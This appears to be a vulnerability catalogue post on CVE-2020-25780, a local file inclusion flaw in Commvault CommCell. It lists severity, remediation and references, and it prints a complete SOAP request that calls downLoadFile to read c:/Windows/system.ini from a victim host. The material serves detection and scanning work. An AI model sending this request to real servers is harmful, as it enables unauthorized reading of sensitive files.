---
layout: post
cve_id: CVE-2020-25780
title: Commvault CommCell - Local File Inclusion
pcap: true
pcap_path: /pcaps/2020/CVE-2020-25780.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-25780.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pdteam
severity: high
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  read sensitive files on the system.

  '
remediation: 'Apply the latest security patches or updates provided by Commvault to
  fix the local file inclusion vulnerability.

  '
reference:
- https://srcincite.io/blog/2021/11/22/unlocking-the-vault.html
- http://kb.commvault.com/article/63264
- https://nvd.nist.gov/vuln/detail/CVE-2020-25780
- https://github.com/ARPSyndicate/cvemon
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2020-25780
  cwe-id: CWE-22
  epss-score: 0.63364
  epss-percentile: 0.98333
  cpe: cpe:2.3:a:commvault:commcell:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: commvault
  product: commcell
tags:
- cve
- cve2020
- commvault
- lfi
- vuln
---

## üîç Vulnerability Description
CommCell in Commvault before 14.68, 15.x before 15.58, 16.x before 16.44, 17.x before 17.29, and 18.x before 18.13 are vulnerable to local file inclusion because an attacker can view a log file can instead view a file outside of the log-files folder.

## üåê HTTP Request
```nohighlight
POST /SearchSvc/CVSearchService.svc HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Connection: close
Content-Length: 298
Accept: */*
Accept-Language: en
Cookie: Login
content-type: text/xml
soapaction: http://tempuri.org/ICVSearchSvc/downLoadFile
Accept-Encoding: gzip

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:downLoadFile>
         <tem:path>c:/Windows/system.ini</tem:path>
      </tem:downLoadFile>
   </soapenv:Body>
</soapenv:Envelope>
```

